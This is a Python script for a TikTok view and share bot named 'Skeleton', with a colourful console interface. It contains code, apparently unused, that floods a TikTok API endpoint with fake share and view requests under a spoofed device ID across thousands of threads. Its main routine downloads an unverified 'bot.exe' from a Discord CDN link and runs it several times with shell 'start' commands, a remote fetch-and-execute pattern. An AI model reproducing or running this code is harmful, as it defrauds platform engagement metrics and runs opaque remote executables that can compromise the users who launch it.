from genericpath import isfile
from os import getenv, remove, system
from requests import packages, Session, get
from urllib3.exceptions import InsecureRequestWarning
from http import cookiejar
from cryptography.fernet import Fernet
from json import dumps
from time import time as now, sleep
from threading import Thread
from multiprocessing import Process, cpu_count
from sys import exit
import os
from pystyle import *



text = r"""
 _______ _     _ _______        _______ _______  _____  __   _
 |______ |____/  |______ |      |______    |    |     | | \  |
 ______| |    \_ |______ |_____ |______    |    |_____| |  \_|
                                                                   """


banner = r"""
                           ,--.
                          {    }
                          K,   }
                         /  `Y`
                    _   /   /
                   {_'-K.__/
                     `/-.__L._
                     /  ' /`\_}
                    /  ' /     
            ____   /  ' /
     ,-'~~~~    ~~/  ' /_
   ,'             ``~~~%%',
  (                     %  Y
 {                      %% I
{      -                 %  `.
|       ',                %  )
|        |   ,..__      __. Y
|    .,_./  Y ' / ^Y   J   )|
\           |' /   |   |   ||
 \          L_/    . _ (_,.'(
  \,   ,      ^^""' / |      )
    \_  \          /,L]     /
      '-_`-,       ` `   ./`
         `-(_            )
             ^^\..___,.--`"""



banner = Add.Add(text, banner, center=True)

def tui():
    Cursor.HideCursor()
    System.Clear()
    print()
    print(Colorate.Diagonal(Colors.DynamicMIX([Colors.light_red, Colors.dark_red, Colors.light_gray, Colors.dark_gray]), Center.XCenter(banner)))
    print()




class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False

packages.urllib3.disable_warnings(category=InsecureRequestWarning)
r = Session()


url = "https://api19.tiktokv.com/aweme/v1/aweme/stats/?channel=tiktok_web&device_type=SM-G9900&device_id=9999999999999999999&os_version=11&version_code=220400&app_name=tiktok_web&device_platform=android&aid=1988"
headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
           "user-agent": 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36'
}

processes = cpu_count()
threads = 5000
delay = 1

shares = 0

r.cookies.set_policy(BlockCookies())


def share(id, first, processes, time):
    global shares
    while True:
        try:
            r.post(url, headers=headers, data=f"item_id={id}&share_delta=1&view_delta=1")
            sleep(delay)
            shares += 1.5
            if first:
                actual = now() - time
                System.Title(f"Skeleton")
                del actual
        except:
            pass

def start_threads(id, first, processes, time):
    for _ in range(threads):
        try:
            Thread(target=(share), args=[id, first, processes, time]).start()
        except:
            pass
    
def start_processes(id, processes, mode):
    first = True
    time = now()
    if mode == 'v':
        mode = "play"
    elif mode == 's':
        mode = "share"
    for _ in range(processes):
        try:
            system(f"start bot.exe {id} 1000000000 {mode}")
        except:
            pass
        first = False

    
def clear(url):
    if "vm.tiktok.com" in url or "vt.tiktok.com" in url:
        return r.head(url, stream=True, verify=False, allow_redirects=True, timeout=5).url.split("/")[5].split("?", 1)[0]
    else:
        return url.split("/")[5].split("?", 1)[0]

def main():
    tui()
    System.Title("Skeleton")
    print(f" {Col.Symbol('-_-', Col.dark_red, Col.dark_gray)} {Col.light_red}Skeleton{Col.dark_gray} - The {Col.light_red}best{Col.dark_gray} TikTok Bot{Col.reset} ")
    print()
    print(f" {Col.Symbol('<3', Col.dark_red, Col.dark_gray)} {Col.dark_gray}Go to {Col.dark_red}github.com/ZeusFuckYou/Skeleton{Col.dark_gray} to download this tool{Col.dark_red} !{Col.reset} ")
    print('')
    
    url = input(f" {Col.Symbol('?', Col.light_red, Col.light_gray)} {Col.light_gray}Enter the TikTok URL {Col.light_red}->{Col.reset} ")
    print()
    try:
        id = clear(url)
    except:
        input(f" {Col.Symbol('!', Col.light_red, Col.light_gray)} {Col.light_gray}Please enter a {Col.light_green}valid{Col.light_gray} TikTok URL{Col.light_red} - {Col.light_green}press enter for cancel!{Col.reset} ")
        return main()
    mode = input(f" {Col.Symbol('?', Col.light_red, Col.light_gray)} {Col.light_gray}Do you want to have {Col.light_blue}views{Col.light_gray} or {Col.light_blue}shares{Col.light_gray} or {Col.light_blue}both {Col.light_red}[{Col.light_blue}v{Col.light_red}/{Col.light_blue}s{Col.light_red}/{Col.light_blue}b{Col.light_red}]{Col.light_red} ->{Col.reset} ")
    print()
    if mode not in ('v', 's', 'b'):
        input(f" {Col.Symbol('!', Col.light_red, Col.light_gray)} {Col.light_gray}Please enter a {Col.light_green}valid{Col.light_gray} mode{Col.light_red} !{Col.reset} ")
        return main()
    processes = input(f" {Col.Symbol('?', Col.light_red, Col.light_gray)} {Col.light_gray}How many processes do you want to use {Col.light_red}[{Col.dark_red}1{Col.light_red}/{Col.dark_red}{cpu_count()}{Col.light_red}] {Col.light_red}->{Col.reset} ")
    print()
    try:
        processes = int(processes)
        if not 0 < processes < cpu_count()+1:
            processes = int('')
    except:
        input(f" {Col.Symbol('!', Col.light_red, Col.light_gray)} {Col.light_gray}Please enter a {Col.light_green}valid{Col.light_gray} number of processes{Col.light_red} !{Col.reset} ")
        return main()
    Cursor.HideCursor()
    print()
    if mode == 'v':
        text = "views"
    elif mode == 's':
        text = "shares"
    else:
        text = "views + shares"
    os.system('cls')
    tui()
    print(f" {Col.Symbol('-_-', Col.dark_red, Col.dark_gray)} {Col.light_red}Skeleton{Col.dark_gray} - The {Col.light_red}best{Col.dark_gray} TikTok Bot{Col.reset} ")
    print()
    print(f" {Col.Symbol('<3', Col.dark_red, Col.dark_gray)} {Col.dark_gray}Go to {Col.dark_red}github.com/ZeusFuckYou/Skeleton{Col.dark_gray} to download this tool{Col.dark_red} !{Col.reset} ")
    print('\n')
    print(f" {Col.Symbol('!', Col.dark_red, Col.dark_gray)} {Col.dark_gray}The {Col.light_green}{text}{Col.dark_gray} are being sent, press {Col.dark_red}enter{Col.dark_gray} to exit{Col.dark_red} !{Col.reset} ")
    if not isfile("bot.exe"):
        open("bot.exe", 'wb').write(get("https://cdn.discordapp.com/attachments/939145816633913355/967113678132506664/bot.exe").content)
    start_processes(id, processes, mode)
    Cursor.HideCursor()
    input()

if __name__ == '__main__':
    main()